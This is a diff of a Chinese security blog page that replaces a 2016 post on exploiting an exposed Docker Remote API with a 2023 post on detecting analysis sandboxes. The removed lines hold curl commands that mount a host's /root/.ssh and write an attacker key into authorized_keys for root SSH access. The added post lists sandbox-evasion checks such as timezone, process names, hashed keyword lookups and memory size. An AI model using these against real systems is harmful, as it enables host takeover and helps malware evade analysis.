@@ -6,27 +6,28 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>Docker Remote API Exploit | 😊#</title>
+  <title>沙盒环境信息收集 | 😊#</title>
   <meta name="author" content="JKme">
   
-  <meta name="description" content="Source:
+  <meta name="description" content="目的收集沙盒的环境
+看图说话
+从上面的图就能看出来很多特征:
 
-http://drops.wooyun.org/papers/15892
-http://zone.wooyun.org/content/27302
+比如中国的时区是-8，沙盒多不是，当然某步除外
+第三条是某步的沙盒，进程里面存在AcrylicService.exe，实际使用的时候可以做一次for循环hash判断，避免程序中直接出现关键词
+大部分沙盒会重新二次修改为随机文件名，也可以从这个点下手
+内存一般小于4G
+部分虚拟机存在Cucoo的特征，比如某步，具体可以看CheckPointSW/InviZzzible
+也可以用主机名作为判断条件
 
-昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：
-可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: curl -sSL https://get.docker.com/ | sh ，如果在链接的时候提示client版本高于服务器版本可以这样子:export DOCKER_API_VERSION=1.9.0，后面的版本自己定。
-另外一种方法就是直接使用Remote API，把本地id_rsa.pub写入到远程宿主机的/root/.ssh/authorized_keys。
-先创建container,同时把宿主机的/root/.ssh挂载到docker的container某个目录，比如/tmp:
-curl  -X POST  -H &#34;Content-Type: application/json&#34;  -d &#39;&amp;#123; &#34;Cmd&#34;: [ &#34;/bin/sh&#34;, &#34;-c&#34;, &#34; echo \&#34;公钥\&#34; &gt;&gt; /tmp/authorized_keys &#34; ], &#34;Image&#34;: &#34;sshd&#34;, &#34;Volumes&#34;: &amp;#123; &#34;/tmp&#34;: &amp;#123;&amp;#125; &amp;#125;, &#34;HostConfig&#34;: &amp;#123; &#34;Binds&#34;: [&#34;/root/.ssh:/tmp:rw&#34;] &amp;#125; &amp;#125; &#39; &#34;http://10.20.30.40:2375/containers/create&#34;
-上面的创建create中的Image可以先远程查看有哪些image: curl -v http://10.20.30.40:2375/images/json，这样会列出所有的image，从其中跳出来一个像这样的
-&amp;quot;RepoTags&amp;quot;: [             &amp;quot;nginx:latest&amp;quot;         ], 注意nginx后面有一个latest。创建的时候指定image，尽可能找有latest的image，
-以上命令会返回创建好的container的id然后启动container: curl -X POST http://10.20.30.40:2375/containers/id/start"> 
+参考链接
+沙箱环境检测和绕过
+CheckPointSW/InviZzzible"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="Docker Remote API Exploit"/>
+  <meta property="og:title" content="沙盒环境信息收集"/>
   <meta property="og:site_name" content="😊#"/>
 
   
@@ -106,7 +107,7 @@ curl  -X POST  -H &#34;Content-Type: application/json&#34;  -d &#39;&amp;#123; &
 
 	
 		<div class="page-header">
-			<h1> Docker Remote API Exploit</h1>
+			<h1> 沙盒环境信息收集</h1>
 		</div>
 	
 
@@ -123,29 +124,26 @@ curl  -X POST  -H &#34;Content-Type: application/json&#34;  -d &#39;&amp;#123; &
 	<div class="mypage">		
 	  		
 
-	  <p>Source:</p>
+	  <h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>收集沙盒的环境</p>
+<h2 id="看图说话"><a href="#看图说话" class="headerlink" title="看图说话"></a>看图说话</h2><p><img src="/2023/04/23/sandbox-info-collect/1.png"></p>
+<p>从上面的图就能看出来很多特征:</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
-<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
+<li>比如中国的时区是-8，沙盒多不是，当然某步除外</li>
+<li>第三条是某步的沙盒，进程里面存在<code>AcrylicService.exe</code>，实际使用的时候可以做一次for循环hash判断，避免程序中直接出现关键词</li>
+<li>大部分沙盒会重新二次修改为随机文件名，也可以从这个点下手</li>
+<li>内存一般小于4G</li>
+<li>部分虚拟机存在Cucoo的特征，比如某步，具体可以看<a target="_blank" rel="noopener" href="https://github.com/CheckPointSW/InviZzzible">CheckPointSW/InviZzzible</a></li>
+<li>也可以用主机名作为判断条件</li>
 </ul>
-<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
-<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
-<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
-<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
-<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
-<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
-<p>然后直接连接就ok:<code>ssh root@10.20.30.40</code></p>
-<blockquote>
-<p>中间主要的坑就是把公钥写入到对应的文件里面，公钥前面要加<code>\</code>转义，并且必须要用双引号把公钥包含起来，创建的时候必须指定image。</p>
-</blockquote>
-<p>参考资料:<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/api/docker_remote_api_v1.21/#start-a-container">https://docs.docker.com/engine/reference/api/docker_remote_api_v1.21/#start-a-container</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CY9RnIAn-la573BWrkufNQ">沙箱环境检测和绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/CheckPointSW/InviZzzible">CheckPointSW/InviZzzible</a></li>
+</ul>
 
 	</div>
 
 	
-	<span id="/2016/05/18/docker-remote-exploit.html" class="leancloud-visitors view" data-flag-title="Docker Remote API Exploit">
+	<span id="/2023/04/23/sandbox-info-collect.html" class="leancloud-visitors view" data-flag-title="沙盒环境信息收集">
 	</span>
 	
 	<div>
@@ -155,13 +153,12 @@ curl  -X POST  -H &#34;Content-Type: application/json&#34;  -d &#39;&amp;#123; &
 
     
     
-    <a href="/2016/07/25/hash-length-attack.html" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2016/05/05/sqli-labs-less-16.html" type="button" class="btn btn-default ">Next<i
+    <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -193,7 +190,7 @@ curl  -X POST  -H &#34;Content-Type: application/json&#34;  -d &#39;&amp;#123; &
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2016-05-18 
+	2023-04-23 
 	</div>
 	
 
@@ -220,7 +217,7 @@ curl  -X POST  -H &#34;Content-Type: application/json&#34;  -d &#39;&amp;#123; &
 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
-			
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%9B%AE%E7%9A%84"><span class="toc-article-text">目的</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%9C%8B%E5%9B%BE%E8%AF%B4%E8%AF%9D"><span class="toc-article-text">看图说话</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">参考链接</span></a></li></ol>
 		</div>
 	
 	</div>
